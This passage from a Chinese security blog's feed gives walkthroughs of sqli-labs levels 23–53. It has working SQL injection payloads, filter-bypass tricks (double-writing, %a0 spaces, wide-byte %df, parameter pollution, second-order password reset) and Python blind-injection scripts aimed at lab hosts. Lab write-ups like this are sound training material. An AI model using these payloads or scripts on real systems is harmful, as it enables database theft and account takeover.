class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-50?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>单引号闭合报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-51?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>同样直接盲注或者时间盲注都行，不需要单引号闭合没什么意义</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>又是一道单引号闭合的题目，直接时间盲注就可以出来参考Less-49的脚本</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这一部分的题目让我了解到怎么对付order by注入，很有意义，个人最喜欢还是用rand函数的那种办法<br>但前面的堆叠注入就感觉意义不大。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-38&quot;&gt;&lt;a href=&quot;#Less-38&quot; class=&quot;headerlink&quot; title=&quot;Less-38&quot;&gt;&lt;/a&gt;Less-38&lt;/h3&gt;&lt;p&gt;从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(二)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-2/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-2/</id>
    <published>2018-08-29T12:01:26.000Z</published>
    <updated>2018-08-29T12:15:57.643Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了<a id="more"></a><br>这一题查看源代码的话发现注释符被过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>但其实对于这一句SQL语句，我们可以直接单引号闭合而不用注释去把后面的东西给省略掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-23/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>直接报出数据库，此题完结</p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这一题应该是设计二次注入的题目<br>在CTF题目里面的话肯定是要你获取admin的账号然后改变admin的密码用admin账号登录获取flag<br>这里主要关键是pass_change.php这里面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure><p>若我们在修改密码的时候<br>注册一个<code>admin’#</code>的用户就是为了后期能够使这一句话后面的内容全都注释的，从而直接更新的是<code>admin</code>的用户名<br>这时候的语句就会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure><p>改你想要密码，然后退出在直接用admin登录就好</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>这一题看源代码会发现有一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把or还有AND都会替换成为<code>&quot;&quot;</code>，这里是大小写都会被拦截下来的<br>这时候其实可以有几个办法能够绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）大小写变形Or,OR,oR</span><br><span class="line">（2）编码，hex，urlencode</span><br><span class="line">（3）添加注释/*or*/</span><br><span class="line">（4）利用符号and=&amp;&amp; or=||</span><br><span class="line">（5）双写绕过</span><br></pre></td></tr></table></figure><p>输入一个单引号会出现单引号的报错，所以我们尝试闭合一下<br><code>http://127.0.0.1/sqlilabs/Less-25/?id=1%27 %23</code> 成功出现回显 </p><p>我这里选择用双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>符号绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; || updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>跟上面一题同样的过滤方式，语句变简单了，不用单引号去闭合<br>但是这一题不能再用报错注入，因为源码中把报错信息给注释掉了，可以用盲注，我们需要用的是union注入或者是盲注<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>再来一个二分法盲注，通过注入成功还会显示登录名这个标志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p>注意 上面这两关在写到关于information这个单词的时候，需要注意它里面存在or，我们需要双写绕过</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>输入?id=’会出现单引号的报错<br>但是想用注释符去闭合发现没效果，再用<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>去尝试发现回显成功，这有可能就是注释符被过滤了<br>看看源代码，果然黑名单被过滤了，空格也被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没关系，这样我们也可以使用报错注入，这里空格要想绕过的话不能够用注释了，我们可以用<code>%a0</code>，但是我们也可以用无空格报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&apos; ||updatexml(1,concat(0x7e,database(),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>用%a0也可以注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-26/?id=1&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.TABLES</span><br><span class="line">%a0where%a0TABLE_SCHEMA=database()),0x7e),1)%a0anandd%0a&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>此处我们需要说明两方面：对于<code>注释</code>和结尾字符的我们此处只能利用<br>构造一个<code>’</code> 来闭合后面到<code>’</code> ；<br>对于空格，有较多的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></p><p>注意上面的编码绕不过的话我们可以用Linux环境测试</p><p>Less-26a<br>只是查询的句子变了，多了一个括号，这一题也不能报错<br>我们可以用盲注<br><a href="http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr</a>(‘1’=’1</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>这里发现源代码里面的黑名单又壮大了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们任然可以用双写绕过，也可以用大小写绕过，但是我们直接报错注入就行了不用麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-27/?id=1&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>这一题就是源代码把报错注入的回显给注释掉<br>那我们用盲注就好<br>双引号闭合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-27a/?id=1"and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;"&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>这一题把<code>union select</code>无论大小写都过滤掉了，把上面那几题能够双写绕过的全都封杀掉了<br>这一题只能够盲注，不能报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-28/?id=1')and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;('&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>这一题跟上面一题区别不大，也是用盲注，也可以用<code>union注入</code>，只是不要出现+号就好<br>忙著自己闭合单引号和括号就行<br>这里我用的是union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-28a/?id=-1%27)unIon(SeLect%201,database(),%273</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>这一题好像是涉及到二层服务的问题，里面的有一个叫HPP(http参数污染)攻击<br>但是没关系就是第一个参数通过了第一层服务器的waf过滤结果第二个参数没有过滤，这是因为apache的特性，只获取最后一个参数<br>这里我们是可以直接用单引号闭合就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-29/?id=1&amp;id=-1%27%20union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>同上面的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br></pre></td></tr></table></figure><p>就是先利用了这个Tomcat去做waf过滤，其实对第二个参数不起作用<br>这次直接闭合双引号就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>Less-31<br>这一题就是SQL查询语句变了一下，我们需要闭合双引号和括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一题我一开始没有头绪，因为所有参数都被转义了，不能够闭合，后来发现是另外的绕过方法，原来是宽字节的问题<br>原理：mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如<code>%aa%5c</code> 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤<code>’</code> 的时候，往往利用的思路是将<code>‘</code> 转换为<code>\’</code><br>因此我们在此想办法将‘ 前面添加的\ 除掉，一般有两种思路：</p><ol><li><code>%df</code> 吃掉<code>\</code> 具体的原因是urlencode(\‘) = <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将<code>\’</code> 中的<code>\</code> 过滤掉，例如可以构造<code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的<code>%5c</code>给注释掉。这也是bypass 的一种方法。</li></ol><p>看源代码我们利用单引号闭合然后加上%df就好，这里我们可以用union注入也可以用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-32/?id=-1%df%27union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>这个同上面那题一模一样直接闭合单引号就好，是就是上面写的check函数应该是作者自己写的，这一题是直接调用了系统的函数<br>对比一下两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-33/?id=-1%df%27 union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><p>这里面怎么防范呢？<br>使用addslashes(),我们需要将mysql_query 设置为<code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><p>这时候我想到了我当时做的一个题目好像utf8_general_ci可以用编码去绕过，但是那个是在mysql服务端起作用的</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>这一题换了post的模式但是利用方法还是有点不同的，<br>本关是post 型的注入漏洞，同样的也是将post 过来的内容进行了‘ \ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的\ 给吃掉。而get 型的方式我们是以url 形式提交的，因此数据会通过URLencode，如何将方法用在post 型的注入当中，我们此处介绍一个新的方法。将utf-8 转换为utf-16 或utf-32，例如将<code>‘</code> 转为utf-16 为<code>♦&#39;</code>  。我们就<br>可以利用这个方式进行尝试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=♦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>但也可以直接用%df绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=ade3&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>这一题水，根本没有使用任何引号不需要闭合，它的转义也是多余的，直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>这一关里面用了<code>mysql_real_escape_string</code>函数去进行过滤<br>是因mysql 我们并没有设置成gbk，所以<code>mysql_real_escape_string()</code>依旧能够被突破。方法<br>和上述是一样的。<br>用utf-16绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%ef%bf%bd%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>用%df去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%df%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>有报错输出选择报错注入，就是post方式的宽字节<br>uname=admin%df’ and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=admin&amp;submit=Submit</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>SQLi-LABS(Adv)这一部分的题目完结，这一部分主要是对输入的数据进行了过滤和防护，但是都过滤得不全，<br>还是会存在多种绕过的方法，这一部分学到了新的知识，就是用utf-16编码绕过宽字节的那一部分内容，其实这里的宽字节前提条件是需要客户端里面设置了gbk，服务端跟过程没有设置同样的编码导致的，所以开发的时候得注意，另外的话这里边的二次注入的题目也是很值得推敲的，也学到了新知识，就是服务器两层架构以及http参数污染的应用，有点意思。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-23&quot;&gt;&lt;a href=&quot;#Less-23&quot; class=&quot;headerlink&quot; title=&quot;Less-23&quot;&gt;&lt;/a&gt;Less-23&lt;/h3&gt;&lt;p&gt;从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(一)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-1/"/>
